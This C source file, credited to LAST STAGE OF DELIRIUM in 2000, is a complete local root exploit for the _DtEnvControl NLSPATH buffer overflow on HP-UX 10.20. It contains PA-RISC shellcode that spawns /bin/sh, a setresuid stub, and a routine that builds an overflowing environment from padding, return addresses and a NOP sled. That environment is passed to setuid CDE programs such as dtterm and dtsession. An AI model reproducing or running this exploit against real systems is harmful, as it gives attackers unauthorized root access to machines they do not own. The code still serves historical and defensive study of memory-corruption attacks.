/*## copyright LAST STAGE OF DELIRIUM oct 2000 poland        *://lsd-pl.net/ #*/
/*## _DtEnvControl NLSPATH                                                   #*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define ADRNUM 244
#define NOPNUM 6000
#define PADNUM 1840
#define PCHNUM 4
#define SECADR 4000
#define PAYLOAD 3

char shellcode[]=
    "\xeb\x5f\x1f\xfd"    /* bl     .+8,%r26               */
    "\x0b\x39\x02\x99"    /* xor    %r25,%r25,%r25         */
    "\xb7\x5a\x40\x22"    /* addi,< 0x11,%r26,%r26         */
    "\x0f\x40\x12\x0e"    /* stbs   %r0,7(%r26)            */
    "\x20\x20\x08\x01"    /* ldil   L%0xc0000004,%r1       */
    "\xe4\x20\xe0\x08"    /* ble    R%0xc0000004(%sr7,%r1) */
    "\xb4\x16\x70\x16"    /* addi,> 0xb,%r0,%r22           */
    "/bin/sh"
;

char setresuidcode[]=    
    "\x0b\x5a\x02\x9a"    /* xor     %r26,%r26,%r26         */
    "\x0b\x39\x02\x99"    /* xor     %r25,%r25,%r25         */
    "\x0b\x18\x02\x98"    /* xor     %r24,%r24,%r24         */
    "\x20\x20\x08\x01"    /* ldil    L%0xc0000004,%r1       */
    "\xe4\x20\xe0\x08"    /* ble     R%0xc0000004(%sr7,%r1) */
    "\xb4\x16\x70\xfc"    /* addi,>  0x7e,%r0,%r22          */
;

char jump[]=
    "\xe0\x40\x00\x00"    /* be      0x0(%sr0,%rp)          */
    "\x37\xdc\x00\x00"    /* copy    %sp,%ret0              */
;

char nop[]="\x0a\xb5\x02\x95";

int main(int argc,char **argv){
    char buffer[14000],adr[4],pch[4],*b,*envp[3];  
    int i,o=100; 

    printf("copyright LAST STAGE OF DELIRIUM oct 2000 poland  //lsd-pl.net/\n");
    printf("_DtEnvControl overflow for HP-UX 10.20 700/800\n");    

    if(argc<2){
        printf("usage: %s [dtterm|dtprintinfo|dtaction|dtsession]\n",argv[0]);
        exit(-1);
    }

    if(!strcmp(argv[1],"dtterm")) o=0;
    if(!strcmp(argv[1],"dtprintinfo")) o=1;
    if(!strcmp(argv[1],"dtaction")) o=2;
    if(!strcmp(argv[1],"dtsession")) o=3;

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()-4500-2400-656;
    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()-11472;

    printf("adr: 0x%x\n",*((unsigned long*)adr));
    printf("pch: 0x%x\n",*((unsigned long*)pch));

    envp[0]=buffer;
    envp[1]=&buffer[2200];
    envp[2]=0;

    b=buffer;
    sprintf(b,"NLSPATH=");
    b+=8;

    for(i=0;i<PADNUM;i++) *b++=0x61;
    for(i=0;i<ADRNUM;i++)  *b++=adr[i%4];
    for(i=0;i<PCHNUM;i++)  *b++=pch[i%4];
    *b=0;

    b=&buffer[2200];
    sprintf(b,"LSD=");
    b+=4;
    for(i=0;i<PAYLOAD;i++) *b++=0x61;
    for(i=0;i<SECADR;i++)  *b++=adr[i%4];
    for(i=0;i<NOPNUM;i++)  *b++=nop[i%4];
    for(i=0;i<strlen(setresuidcode);i++) *b++=setresuidcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    switch(o){
    case 0: execle("/usr/dt/bin/dtterm","lsd",0,envp); break;
    case 1: execle("/usr/dt/bin/dtprintinfo","lsd",0,envp); break;
    case 2: execle("/usr/dt/bin/dtaction","lsd",0,envp); break;
    case 3: execle("/usr/dt/bin/dtsession","lsd",0,envp); break;
    default: exit(-1);
    }
}

